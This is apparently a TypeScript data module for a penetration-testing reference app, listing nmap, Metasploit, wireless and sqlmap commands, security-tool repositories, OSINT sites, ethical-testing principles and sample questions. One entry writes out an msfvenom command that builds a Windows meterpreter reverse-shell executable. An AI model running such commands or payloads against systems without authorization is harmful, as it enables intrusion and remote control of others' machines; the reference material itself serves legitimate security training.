import { SecurityCommand, GitHubRepo, OSINTResource } from './types';

export const securityCommands: SecurityCommand[] = [
  { id:1, command:"nmap -sS target.com", description:"Basic TCP SYN scan", category:"recon" },
  { id:2, command:"nmap -sV -sC target.com", description:"Version detection + default scripts", category:"recon" },
  { id:3, command:"nmap -sS -sV -sC -O -p- target.com", description:"Comprehensive scan", category:"recon" },
  { id:4, command:"theharvester -d company.com -b google,linkedin,bing", description:"Email/domain discovery", category:"osint" },
  { id:5, command:"msfconsole", description:"Start Metasploit", category:"exploitation" },
  { id:6, command:"search eternalblue", description:"Search Metasploit exploits", category:"exploitation" },
  { id:7, command:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe", description:"Payload generation", category:"payloads" },
  { id:8, command:"airmon-ng start wlan0", description:"Enable monitor mode", category:"wireless" },
  { id:9, command:"airodump-ng wlan0mon", description:"Scan for WiFi networks", category:"wireless" },
  { id:10, command:"sqlmap -u 'http://example.com/page.php?id=1' --dbs", description:"SQL injection automation", category:"webapp" }
];

export const githubRepos: GitHubRepo[] = [
  { id:1, name:"sherlock-project/sherlock", url:"https://github.com/sherlock-project/sherlock", description:"Username enumeration across social networks", stars:45000, forks:5500, language:"Python" },
  { id:2, name:"laramies/theHarvester", url:"https://github.com/laramies/theHarvester", description:"E‑mail, subdomain and people reconnaissance", stars:8000, forks:1800, language:"Python" },
  { id:3, name:"smicallef/spiderfoot", url:"https://github.com/smicallef/spiderfoot", description:"Automated OSINT framework", stars:9000, forks:2000, language:"Python" },
  { id:4, name:"swisskyrepo/PayloadsAllTheThings", url:"https://github.com/swisskyrepo/PayloadsAllTheThings", description:"A list of useful payloads and bypasses", stars:48000, forks:13000, language:"JavaScript" },
  { id:5, name:"carlospolop/PEASS-ng", url:"https://github.com/carlospolop/PEASS-ng", description:"Privilege escalation scripts (linpeas/winpeas)", stars:36000, forks:8000, language:"Shell" }
];

export const osintResources: OSINTResource[] = [
  { name:"Bellingcat", url:"https://www.bellingcat.com", description:"Investigative journalism toolkit" },
  { name:"OSINT Framework", url:"https://osintframework.com", description:"Comprehensive OSINT resource directory" },
  { name:"Intel Techniques", url:"https://inteltechniques.com", description:"Michael Bazzell's OSINT tools and training" },
  { name:"Have I Been Pwned", url:"https://haveibeenpwned.com", description:"Breach data search" }
];

export const ethicalPrinciples: string[] = [
  "Always obtain written authorization before testing any system.",
  "Stay within defined scope – never exceed boundaries.",
  "Avoid causing damage or disruption to services.",
  "Protect all findings – treat them as confidential.",
  "Document everything thoroughly.",
  "Provide clear, actionable recommendations in reports.",
  "Follow all relevant laws (CFAA, GDPR, etc.).",
  "Practice responsible disclosure."
];

export const sampleQuestions: string[] = [
  "How do I perform a basic reconnaissance with Nmap?",
  "Explain the OSINT methodology for finding email addresses",
  "What are the best practices for ethical hacking?",
  "How do I use Metasploit for vulnerability exploitation?",
  "Show me common Kali Linux commands for network analysis",
  "What GitHub repositories are best for security tools?",
  "How to secure a web server against SQL injection?",
  "What tools should I use for WiFi penetration testing?"
];
